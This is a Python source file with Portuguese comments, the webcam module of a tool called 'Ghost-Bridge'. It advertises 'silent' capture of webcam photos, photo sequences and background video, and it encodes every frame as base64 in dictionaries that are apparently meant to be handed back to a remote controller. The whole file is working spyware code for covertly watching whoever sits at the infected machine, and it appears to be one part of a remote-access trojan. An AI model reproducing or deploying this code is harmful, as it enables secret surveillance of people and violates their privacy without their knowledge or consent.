"""
Ghost-Bridge - Webcam Capture Module
Captura silenciosa de imagens/vídeo da webcam.
"""
import base64
import io
import time
import threading
from datetime import datetime

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False


class WebcamCapture:
    """
    Captura silenciosa da webcam.
    
    Features:
    - Captura de foto única
    - Gravação de vídeo
    - Múltiplas câmeras
    - Compressão configurável
    """
    
    def __init__(self, camera_index=0, quality=50):
        """
        Args:
            camera_index: Índice da câmera (0 = padrão)
            quality: Qualidade JPEG (1-100)
        """
        if not CV2_AVAILABLE:
            raise ImportError("[!] opencv-python não instalado. Execute: pip install opencv-python")
        
        self.camera_index = camera_index
        self.quality = quality
        self.recording = False
        self.frames = []
    
    def _get_camera(self):
        """Abre a câmera."""
        cap = cv2.VideoCapture(self.camera_index)
        
        if not cap.isOpened():
            return None
        
        # Aguarda inicialização
        time.sleep(0.5)
        return cap
    
    def capture_photo(self):
        """
        Captura uma foto da webcam.
        
        Returns:
            Dict com timestamp e imagem em base64
        """
        cap = self._get_camera()
        if not cap:
            return {'error': 'Webcam não encontrada'}
        
        try:
            # Captura alguns frames para estabilizar
            for _ in range(5):
                cap.read()
            
            ret, frame = cap.read()
            
            if not ret:
                return {'error': 'Falha ao capturar frame'}
            
            # Encode para JPEG
            encode_params = [cv2.IMWRITE_JPEG_QUALITY, self.quality]
            _, buffer = cv2.imencode('.jpg', frame, encode_params)
            
            img_base64 = base64.b64encode(buffer).decode('utf-8')
            
            return {
                'timestamp': datetime.now().isoformat(),
                'width': frame.shape[1],
                'height': frame.shape[0],
                'size_kb': len(img_base64) // 1024,
                'data': img_base64
            }
            
        finally:
            cap.release()
    
    def capture_sequence(self, count=5, interval=1.0):
        """
        Captura sequência de fotos.
        
        Args:
            count: Número de fotos
            interval: Intervalo entre fotos (segundos)
            
        Returns:
            Lista de fotos em base64
        """
        photos = []
        cap = self._get_camera()
        
        if not cap:
            return {'error': 'Webcam não encontrada'}
        
        try:
            # Estabiliza
            for _ in range(5):
                cap.read()
            
            for i in range(count):
                ret, frame = cap.read()
                
                if ret:
                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, self.quality]
                    _, buffer = cv2.imencode('.jpg', frame, encode_params)
                    
                    photos.append({
                        'index': i,
                        'timestamp': datetime.now().isoformat(),
                        'data': base64.b64encode(buffer).decode('utf-8')
                    })
                
                if i < count - 1:
                    time.sleep(interval)
            
            return photos
            
        finally:
            cap.release()
    
    def list_cameras(self):
        """Lista câmeras disponíveis."""
        cameras = []
        
        for i in range(5):  # Testa até 5 câmeras
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append({
                    'index': i,
                    'width': int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)),
                    'height': int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)),
                    'fps': cap.get(cv2.CAP_PROP_FPS)
                })
                cap.release()
        
        return cameras
    
    def start_recording(self, duration=10, fps=10):
        """
        Inicia gravação em background.
        
        Args:
            duration: Duração em segundos
            fps: Frames por segundo
        """
        self.recording = True
        self.frames = []
        
        def record():
            cap = self._get_camera()
            if not cap:
                return
            
            try:
                interval = 1.0 / fps
                start_time = time.time()
                
                while self.recording and (time.time() - start_time) < duration:
                    ret, frame = cap.read()
                    if ret:
                        # Reduz tamanho
                        small = cv2.resize(frame, (320, 240))
                        _, buffer = cv2.imencode('.jpg', small, 
                                                  [cv2.IMWRITE_JPEG_QUALITY, 30])
                        self.frames.append(buffer)
                    
                    time.sleep(interval)
                    
            finally:
                cap.release()
                self.recording = False
        
        thread = threading.Thread(target=record, daemon=True)
        thread.start()
        
        return {'status': 'recording', 'duration': duration, 'fps': fps}
    
    def stop_recording(self):
        """Para gravação e retorna frames."""
        self.recording = False
        time.sleep(0.5)  # Aguarda finalização
        
        if not self.frames:
            return {'error': 'Nenhum frame capturado'}
        
        # Combina frames em um "vídeo" (lista de JPEGs em base64)
        frames_b64 = [base64.b64encode(f).decode('utf-8') for f in self.frames]
        
        return {
            'frame_count': len(frames_b64),
            'frames': frames_b64[:100]  # Limita
        }


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste de Webcam")
    
    if not CV2_AVAILABLE:
        print("[!] OpenCV não instalado")
        exit()
    
    wc = WebcamCapture()
    
    print("[+] Câmeras disponíveis:")
    for cam in wc.list_cameras():
        print(f"    Camera {cam['index']}: {cam['width']}x{cam['height']}")
    
    print("\n[+] Capturando foto...")
    photo = wc.capture_photo()
    
    if 'error' not in photo:
        print(f"    Capturado: {photo['width']}x{photo['height']}, {photo['size_kb']} KB")
        
        # Salva para teste
        with open("test_webcam.jpg", "wb") as f:
            f.write(base64.b64decode(photo['data']))
        print("    Salvo como test_webcam.jpg")
    else:
        print(f"    {photo['error']}")
